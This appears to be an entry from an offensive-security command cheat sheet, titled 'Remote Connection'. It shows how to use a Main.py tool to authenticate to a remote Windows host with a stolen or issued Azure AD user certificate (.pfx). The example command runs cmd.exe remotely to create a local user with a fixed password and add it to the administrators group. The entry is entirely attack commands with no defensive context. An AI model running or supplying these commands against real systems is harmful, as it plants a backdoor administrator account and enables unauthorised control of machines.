---
id: 99cfdec3-8d1e-4dbb-a4f0-69e53da5907d
name: Remote Connection
type: command
executor: bash
data: 'Main.py [-h] --usercert USERCERT --certpass CERTPASS --remoteip REMOTEIP

  Main.py --usercert "admin.pfx" --certpass password --remoteip 10.10.10.10


  python Main.py --usercert C:\Users\Username\Documents\username\<USERNAME>@<TENANT
  NAME>.onmicrosoft.com.pfx --

  certpass AzureADCert --remoteip 10.10.10.10 --command "cmd.exe /c net user username
  Password@123 /add /Y && net localgroup administrators username /add"'
output: null
created_at: '2023-04-06T03:56:15.747960+00:00'
updated_at: '2023-05-25T18:35:34.910146+00:00'
---

# Remote Connection

```bash
Main.py [-h] --usercert USERCERT --certpass CERTPASS --remoteip REMOTEIP
Main.py --usercert "admin.pfx" --certpass password --remoteip 10.10.10.10

python Main.py --usercert C:\Users\Username\Documents\username\<USERNAME>@<TENANT NAME>.onmicrosoft.com.pfx --
certpass AzureADCert --remoteip 10.10.10.10 --command "cmd.exe /c net user username Password@123 /add /Y && net localgroup administrators username /add"
```


